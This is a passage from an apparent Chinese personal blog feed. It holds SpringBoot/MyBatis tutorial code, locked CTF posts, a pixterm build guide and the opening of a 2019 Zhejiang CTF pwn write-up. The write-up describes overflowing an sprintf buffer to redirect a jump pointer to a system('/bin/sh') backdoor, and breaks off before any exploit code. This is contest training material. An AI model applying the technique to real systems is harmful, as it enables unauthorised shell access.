class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">package com.example.demo.mapper;</span><br><span class="line">import com.example.demo.entity.User;</span><br><span class="line">import org.springframework.stereotype.Repository;</span><br><span class="line">import java.util.List;</span><br><span class="line">@Repository</span><br><span class="line">public interface UserMapper {</span><br><span class="line">    List<user> getUsers();</user></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h2 id="service层：UserService"><a href="#service层：UserService" class="headerlink" title="service层：UserService"></a>service层：UserService</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">package com.example.demo.service;</span><br><span class="line">import com.example.demo.entity.User;</span><br><span class="line">import com.example.demo.mapper.UserMapper;</span><br><span class="line">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line">import org.springframework.stereotype.Service;</span><br><span class="line">import org.springframework.transaction.annotation.Transactional;</span><br><span class="line">import java.util.List;</span><br><span class="line">@Service</span><br><span class="line">@Transactional</span><br><span class="line">public class UserService {</span><br><span class="line">    @Autowired</span><br><span class="line">    UserMapper userMapper;</span><br><span class="line">    public List<user> getUsers() {</user></span><br><span class="line">        return userMapper.getUsers();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h2 id="mapping-xml配置：UserMapper-xml"><a href="#mapping-xml配置：UserMapper-xml" class="headerlink" title="mapping.xml配置：UserMapper.xml"></a>mapping.xml配置：UserMapper.xml</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><!--?xml version="1.0" encoding="UTF-8"?--></span><br><span class="line"></span><br><span class="line"><mapper namespace="com.example.demo.mapper.UserMapper"></mapper></span><br><span class="line">    <resultmap id="user" type="com.example.demo.entity.User"></resultmap></span><br><span class="line">        <result column="id" jdbctype="INTEGER" property="id"></result></span><br><span class="line">        <result column="name" jdbctype="VARCHAR" property="name"></result></span><br><span class="line">        <result column="account" jdbctype="VARCHAR" property="account"></result></span><br><span class="line">        <result column="password" jdbctype="VARCHAR" property="password"></result></span><br><span class="line">        <result column="email" jdbctype="VARCHAR" property="email"></result></span><br><span class="line">    </span><br><span class="line">    <select id="getUsers" resultmap="user">        select * from user    </select></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></div><h2 id="运行效果："><a href="#运行效果：" class="headerlink" title="运行效果："></a>运行效果：</h2><p><a href="/2019/11/05/SpringBoot+Mybatis+Thymeleaf_%E5%9F%BA%E7%A1%80%E5%BC%80%E5%8F%91/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/11/05/SpringBoot+Mybatis+Thymeleaf_%E5%9F%BA%E7%A1%80%E5%BC%80%E5%8F%91/2.png" class="lazyload"></a></p><h2 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h2><h3 id="1、如果service层-Autowired注解的变量出现了ERROR，但是运行时没有问题，请在Mapper层接口头部添加-Repository"><a href="#1、如果service层-Autowired注解的变量出现了ERROR，但是运行时没有问题，请在Mapper层接口头部添加-Repository" class="headerlink" title="1、如果service层@Autowired注解的变量出现了ERROR，但是运行时没有问题，请在Mapper层接口头部添加@Repository"></a>1、如果service层@Autowired注解的变量出现了ERROR，但是运行时没有问题，请在Mapper层接口头部添加@Repository</h3><h3 id="2、请注意mapper-xml文件中的目录，若报错，请注意查看"><a href="#2、请注意mapper-xml文件中的目录，若报错，请注意查看" class="headerlink" title="2、请注意mapper.xml文件中的目录，若报错，请注意查看"></a>2、请注意mapper.xml文件中的目录，若报错，请注意查看</h3><h1 id="带参数的输出某id的数据库数据"><a href="#带参数的输出某id的数据库数据" class="headerlink" title="带参数的输出某id的数据库数据"></a>带参数的输出某id的数据库数据</h1><h2 id="1、UserMapper-java需要加上getUser-Integer-id"><a href="#1、UserMapper-java需要加上getUser-Integer-id" class="headerlink" title="1、UserMapper.java需要加上getUser(Integer id)"></a>1、UserMapper.java需要加上getUser(Integer id)</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">package com.example.demo.mapper;</span><br><span class="line">import com.example.demo.entity.User;</span><br><span class="line">import org.springframework.stereotype.Repository;</span><br><span class="line">import java.util.List;</span><br><span class="line">@Repository</span><br><span class="line">public interface UserMapper {</span><br><span class="line">    List<user> getUsers();</user></span><br><span class="line">    User getUser(Integer id);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h2 id="2、UserService-java需要定义getUser-Integer-id"><a href="#2、UserService-java需要定义getUser-Integer-id" class="headerlink" title="2、UserService.java需要定义getUser(Integer id)"></a>2、UserService.java需要定义getUser(Integer id)</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package com.example.demo.service;</span><br><span class="line">import com.example.demo.entity.User;</span><br><span class="line">import com.example.demo.mapper.UserMapper;</span><br><span class="line">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line">import org.springframework.stereotype.Service;</span><br><span class="line">import org.springframework.transaction.annotation.Transactional;</span><br><span class="line">import java.util.List;</span><br><span class="line">@Service</span><br><span class="line">@Transactional</span><br><span class="line">public class UserService {</span><br><span class="line">    @Autowired</span><br><span class="line">    UserMapper userMapper;</span><br><span class="line">    public List<user> getUsers() {</user></span><br><span class="line">        return userMapper.getUsers();</span><br><span class="line">    }</span><br><span class="line">    public User getUser(Integer id){</span><br><span class="line">        return userMapper.getUser(id);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h2 id="3、UserController添加新的业务"><a href="#3、UserController添加新的业务" class="headerlink" title="3、UserController添加新的业务"></a>3、UserController添加新的业务</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import com.example.demo.service.UserService;</span><br><span class="line">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line">import org.springframework.web.bind.annotation.RestController;</span><br><span class="line">import java.util.List;</span><br><span class="line">@RestController</span><br><span class="line">@RequestMapping("/testBoot")</span><br><span class="line">public class UserController {</span><br><span class="line">    @Autowired</span><br><span class="line">    private UserService userService;</span><br><span class="line">    @RequestMapping(value = "/getUsers",method = RequestMethod.GET)</span><br><span class="line">    public List<user> getUsers(){</user></span><br><span class="line">        return userService.getUsers();</span><br><span class="line">    }</span><br><span class="line">    @RequestMapping(value = "getUser",method = RequestMethod.GET)</span><br><span class="line">    public User getUser(@RequestParam(value="id",required = true) Integer id){</span><br><span class="line">        return userService.getUser(id);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h2 id="4、UserMapper-xml需要添加新的sql语句"><a href="#4、UserMapper-xml需要添加新的sql语句" class="headerlink" title="4、UserMapper.xml需要添加新的sql语句"></a>4、UserMapper.xml需要添加新的sql语句</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><!--?xml version="1.0" encoding="UTF-8"?--></span><br><span class="line"></span><br><span class="line"><mapper namespace="com.example.demo.mapper.UserMapper"></mapper></span><br><span class="line">    <resultmap id="user" type="com.example.demo.entity.User"></resultmap></span><br><span class="line">        <result column="id" jdbctype="INTEGER" property="id"></result></span><br><span class="line">        <result column="name" jdbctype="VARCHAR" property="name"></result></span><br><span class="line">        <result column="account" jdbctype="VARCHAR" property="account"></result></span><br><span class="line">        <result column="password" jdbctype="VARCHAR" property="password"></result></span><br><span class="line">        <result column="email" jdbctype="VARCHAR" property="email"></result></span><br><span class="line">    </span><br><span class="line">    <select id="getUsers" resultmap="user">        select * from user    </select></span><br><span class="line">    <select id="getUser" resultmap="user">        select * from user                    id = #{id}            </select></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></div><h2 id="运行效果"><a href="#运行效果" class="headerlink" title="运行效果"></a>运行效果</h2><p><a href="/2019/11/05/SpringBoot+Mybatis+Thymeleaf_%E5%9F%BA%E7%A1%80%E5%BC%80%E5%8F%91/3.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/11/05/SpringBoot+Mybatis+Thymeleaf_%E5%9F%BA%E7%A1%80%E5%BC%80%E5%8F%91/3.png" class="lazyload"></a></p><h1 id="通过thymeleaf显示数据库数据"><a href="#通过thymeleaf显示数据库数据" class="headerlink" title="通过thymeleaf显示数据库数据"></a>通过thymeleaf显示数据库数据</h1><hr><h2 id="1、首先我们再创建一个view层，java代码类似于UserController，但是不同的是把restController替换为Controller，这样就可以跳转到指定的网页了，如果函数参数中带有model就可以传入数据到网页，通过thymeleaf来渲染网页。"><a href="#1、首先我们再创建一个view层，java代码类似于UserController，但是不同的是把restController替换为Controller，这样就可以跳转到指定的网页了，如果函数参数中带有model就可以传入数据到网页，通过thymeleaf来渲染网页。" class="headerlink" title="1、首先我们再创建一个view层，java代码类似于UserController，但是不同的是把restController替换为Controller，这样就可以跳转到指定的网页了，如果函数参数中带有model就可以传入数据到网页，通过thymeleaf来渲染网页。"></a>1、首先我们再创建一个view层，java代码类似于UserController，但是不同的是把restController替换为Controller，这样就可以跳转到指定的网页了，如果函数参数中带有model就可以传入数据到网页，通过thymeleaf来渲染网页。</h2><h2 id="2、UserView代码如下"><a href="#2、UserView代码如下" class="headerlink" title="2、UserView代码如下"></a>2、UserView代码如下</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package com.example.demo.view;</span><br><span class="line"></span><br><span class="line">import com.example.demo.service.UserService;</span><br><span class="line">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.ui.Model;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line">@Controller</span><br><span class="line">@RequestMapping(value = "user_view")</span><br><span class="line">public class UserView {</span><br><span class="line">    @Autowired</span><br><span class="line">    private UserService userService;</span><br><span class="line">    @RequestMapping(value = "/test")</span><br><span class="line">    public String user_view(@RequestParam(value = "id",required = false) Integer id, Model model){</span><br><span class="line">        model.addAttribute("user_data",userService.getUser(id));</span><br><span class="line">        return "index";</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div><h2 id="3、接着我们开始写html，这里我们需要用到类似于EL语言的写法，代码如下"><a href="#3、接着我们开始写html，这里我们需要用到类似于EL语言的写法，代码如下" class="headerlink" title="3、接着我们开始写html，这里我们需要用到类似于EL语言的写法，代码如下"></a>3、接着我们开始写html，这里我们需要用到类似于EL语言的写法，代码如下</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <meta charset="UTF-8"></span><br><span class="line">    <title>Title</title></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><p th:text="${user_data.name}"></p></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></div><h2 id="运行效果如下："><a href="#运行效果如下：" class="headerlink" title="运行效果如下："></a>运行效果如下：</h2><p><a href="/2019/11/05/SpringBoot+Mybatis+Thymeleaf_%E5%9F%BA%E7%A1%80%E5%BC%80%E5%8F%91/4.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/11/05/SpringBoot+Mybatis+Thymeleaf_%E5%9F%BA%E7%A1%80%E5%BC%80%E5%8F%91/4.png" class="lazyload"></a></p></body></html>]]></content>
    
    <summary type="html">
    
      
      
        &lt;html lang=&quot;en&quot; xmlns:th=&quot;http://www.thymeleaf.org&quot;&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 id=&quot;SpringBoot-Mybatis-简单的测试&quot;&gt;&lt;a href=&quot;#SpringBoot-Mybatis-简单的测试&quot;
      
    
    </summary>
    
    
      <category term="SpringBoot" scheme="http://yoursite.com/categories/SpringBoot/"/>
    
    
      <category term="SpringBoot" scheme="http://yoursite.com/tags/SpringBoot/"/>
    
      <category term="Mybatis" scheme="http://yoursite.com/tags/Mybatis/"/>
    
  </entry>
  
  <entry>
    <title>CTF-Pwn-OGeek-OVM-VMPwn详解</title>
    <link href="http://yoursite.com/2019/10/13/CTF-Pwn-OGeek-OVM-VMPwn%E8%AF%A6%E8%A7%A3/"/>
    <id>http://yoursite.com/2019/10/13/CTF-Pwn-OGeek-OVM-VMPwn%E8%AF%A6%E8%A7%A3/</id>
    <published>2019-10-12T16:18:02.000Z</published>
    <updated>2019-11-28T02:22:28.000Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="该文章被加密了，请联系管理员请求密码。" /><label>该文章被加密了，请联系管理员请求密码。</label><button class="hbe-button" onclick="fireKeyEvent(document.getElementById('hexo-blog-encrypt'),'keydown',13);">解密文章</button><div class="bottom-line"></div></div><script>function fireKeyEvent(el, evtType, keyCode){var doc = el.ownerDocument,win = doc.defaultView || doc.parentWindow,evtObj;if(doc.createEvent){if(win.KeyEvent) {evtObj = doc.createEvent('KeyEvents');evtObj.initKeyEvent( evtType, true, true, win, false, false, false, false, keyCode, 0 );}else {evtObj = doc.createEvent('UIEvents');Object.defineProperty(evtObj, 'keyCode', {get : function() { return this.keyCodeVal; }}); Object.defineProperty(evtObj, 'which', {get : function() { return this.keyCodeVal; }});evtObj.initUIEvent( evtType, true, true, win, 1 );evtObj.keyCodeVal = keyCode;if (evtObj.keyCode !== keyCode) {console.log("keyCode " + evtObj.keyCode + " 和 (" + evtObj.which + ") 不匹配");}}el.dispatchEvent(evtObj);} else if(doc.createEventObject){evtObj = doc.createEventObject();evtObj.keyCode = keyCode;el.fireEvent('on' + evtType, evtObj);}}</script><script id="hbeData" type="hbeData" data-hmacdigest="d91d1f39f4c8d687860535a7fd89aeda9358224ad8a1c272542f0241f24ff989"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      该文章被加密了，请联系管理员请求密码。
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Linux-控制台输出图片</title>
    <link href="http://yoursite.com/2019/10/10/Linux-%E6%8E%A7%E5%88%B6%E5%8F%B0%E8%BE%93%E5%87%BA%E5%9B%BE%E7%89%87/"/>
    <id>http://yoursite.com/2019/10/10/Linux-%E6%8E%A7%E5%88%B6%E5%8F%B0%E8%BE%93%E5%87%BA%E5%9B%BE%E7%89%87/</id>
    <published>2019-10-10T15:21:02.000Z</published>
    <updated>2019-10-16T16:17:00.000Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h1 id="Linux-控制台输出图片"><a href="#Linux-控制台输出图片" class="headerlink" title="Linux-控制台输出图片"></a>Linux-控制台输出图片</h1><h2 id="由于一些原因，需要对程序输出一定的像素化的图片，同时远程nc连接回显的数据也要完好无损。方法如下："><a href="#由于一些原因，需要对程序输出一定的像素化的图片，同时远程nc连接回显的数据也要完好无损。方法如下：" class="headerlink" title="由于一些原因，需要对程序输出一定的像素化的图片，同时远程nc连接回显的数据也要完好无损。方法如下："></a>由于一些原因，需要对程序输出一定的像素化的图片，同时远程nc连接回显的数据也要完好无损。方法如下：</h2><h2 id="安装Go编译器"><a href="#安装Go编译器" class="headerlink" title="安装Go编译器"></a>安装Go编译器</h2><hr><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">控制台输出一下代码</span><br><span class="line">apt install golang-go</span><br></pre></td></tr></tbody></table></figure></div><h2 id="下载配置-pixterm"><a href="#下载配置-pixterm" class="headerlink" title="下载配置 pixterm"></a>下载配置 pixterm</h2><hr><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/eliukblau/pixterm</span><br><span class="line">然后输入以下指令</span><br><span class="line">go build pixterm.go</span><br><span class="line">对pixterm.go源码进行编译，但是会报错，我们就是需要它报错，然后知道它需要哪些包，同时它也会输出目录。</span><br><span class="line">通过git clone指令来下载文件包，然后把文件放到对应的位置，同时pixterm的位置也要变动，放到对应的gopath目录下。</span><br><span class="line">git clone https://github.com/lucasb-eyer/go-colorful</span><br><span class="line">git clone https://github.com/golang/crypto.git</span><br><span class="line">将pixterm目录也放到对应的位置</span><br></pre></td></tr></tbody></table></figure></div><h2 id="编译pixterm-go"><a href="#编译pixterm-go" class="headerlink" title="编译pixterm.go"></a>编译pixterm.go</h2><hr><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go build pixterm.go</span><br></pre></td></tr></tbody></table></figure></div><h3 id="然后它输出一个可执行文件，接下来就可以按照github的官方介绍来使用了"><a href="#然后它输出一个可执行文件，接下来就可以按照github的官方介绍来使用了" class="headerlink" title="然后它输出一个可执行文件，接下来就可以按照github的官方介绍来使用了"></a>然后它输出一个可执行文件，接下来就可以按照github的官方介绍来使用了</h3><h3 id="https-github-com-eliukblau-pixterm"><a href="#https-github-com-eliukblau-pixterm" class="headerlink" title="https://github.com/eliukblau/pixterm"></a><a href="https://github.com/eliukblau/pixterm" target="_blank" rel="noopener">https://github.com/eliukblau/pixterm</a></h3><h3 id="如果要保存ascii可通过以下指令"><a href="#如果要保存ascii可通过以下指令" class="headerlink" title="如果要保存ascii可通过以下指令"></a>如果要保存ascii可通过以下指令</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pixterm 图片名 > logo.txt</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
    
    <summary type="html">
    
      
      
        &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 id=&quot;Linux-控制台输出图片&quot;&gt;&lt;a href=&quot;#Linux-控制台输出图片&quot; class=&quot;headerlink&quot; title=&quot;Linux-控制台输出图片&quot;&gt;&lt;/a&gt;Linux-控制台输出图片&lt;/h1&gt;&lt;h2 
      
    
    </summary>
    
    
      <category term="常识" scheme="http://yoursite.com/categories/%E5%B8%B8%E8%AF%86/"/>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>CTF-Pwn-realloc_malloc_calloc详解</title>
    <link href="http://yoursite.com/2019/10/04/CTF-Pwn-realloc_malloc_calloc%E8%AF%A6%E8%A7%A3/"/>
    <id>http://yoursite.com/2019/10/04/CTF-Pwn-realloc_malloc_calloc%E8%AF%A6%E8%A7%A3/</id>
    <published>2019-10-04T06:07:02.000Z</published>
    <updated>2019-10-05T10:40:48.000Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="该文章被加密了，请联系管理员请求密码。" /><label>该文章被加密了，请联系管理员请求密码。</label><button class="hbe-button" onclick="fireKeyEvent(document.getElementById('hexo-blog-encrypt'),'keydown',13);">解密文章</button><div class="bottom-line"></div></div><script>function fireKeyEvent(el, evtType, keyCode){var doc = el.ownerDocument,win = doc.defaultView || doc.parentWindow,evtObj;if(doc.createEvent){if(win.KeyEvent) {evtObj = doc.createEvent('KeyEvents');evtObj.initKeyEvent( evtType, true, true, win, false, false, false, false, keyCode, 0 );}else {evtObj = doc.createEvent('UIEvents');Object.defineProperty(evtObj, 'keyCode', {get : function() { return this.keyCodeVal; }}); Object.defineProperty(evtObj, 'which', {get : function() { return this.keyCodeVal; }});evtObj.initUIEvent( evtType, true, true, win, 1 );evtObj.keyCodeVal = keyCode;if (evtObj.keyCode !== keyCode) {console.log("keyCode " + evtObj.keyCode + " 和 (" + evtObj.which + ") 不匹配");}}el.dispatchEvent(evtObj);} else if(doc.createEventObject){evtObj = doc.createEventObject();evtObj.keyCode = keyCode;el.fireEvent('on' + evtType, evtObj);}}</script><script id="hbeData" type="hbeData" data-hmacdigest="d79ede1ed23d022a74bee52a09a92841a42f3cf1369b751239ed68b9556ff8c2"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      该文章被加密了，请联系管理员请求密码。
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>CTF-19年浙江省大学生网络安全大赛</title>
    <link href="http://yoursite.com/2019/09/23/CTF-19%E5%B9%B4%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>http://yoursite.com/2019/09/23/CTF-19%E5%B9%B4%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</id>
    <published>2019-09-23T06:33:43.000Z</published>
    <updated>2019-09-26T16:44:14.000Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h1 id="CTF-19年浙江省大学生网络安全大赛"><a href="#CTF-19年浙江省大学生网络安全大赛" class="headerlink" title="CTF-19年浙江省大学生网络安全大赛"></a>CTF-19年浙江省大学生网络安全大赛</h1><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="0x1-login"><a href="#0x1-login" class="headerlink" title="0x1 login"></a>0x1 login</h2><h3 id="这道题是用C-写的，有很多很长名字的函数，不过问题不大，经过ida分析，只需要输入以下数据，即可发生某地址跳转"><a href="#这道题是用C-写的，有很多很长名字的函数，不过问题不大，经过ida分析，只需要输入以下数据，即可发生某地址跳转" class="headerlink" title="这道题是用C++写的，有很多很长名字的函数，不过问题不大，经过ida分析，只需要输入以下数据，即可发生某地址跳转"></a>这道题是用C++写的，有很多很长名字的函数，不过问题不大，经过ida分析，只需要输入以下数据，即可发生某地址跳转</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> _____   _  ____ _____ _____   _                _       </span><br><span class="line">|__  /  | |/ ___|_   _|  ___| | |    ___   __ _(_)_ __  </span><br><span class="line">  / /_  | | |     | | | |_    | |   / _ \ / _` | | '_ \ </span><br><span class="line"> / /| |_| | |___  | | |  _|   | |__| (_) | (_| | | | | |</span><br><span class="line">/____\___/ \____| |_| |_|     |_____\___/ \__, |_|_| |_|</span><br><span class="line">                                          |___/         </span><br><span class="line">Please enter username: admin</span><br><span class="line">Please enter password: 2jctf_pa5sw0rd</span><br><span class="line">Password accepted: Password accepted: </span><br><span class="line"></span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></tbody></table></figure></div><h3 id="接着发现sprintf的长度没有足够大，可以覆盖到这个跳转指针，且程序本身就有system-“-bin-sh”-的backdoor，所以可以直接覆盖这个跳转指针为backdoor指针，即可拿到shell"><a 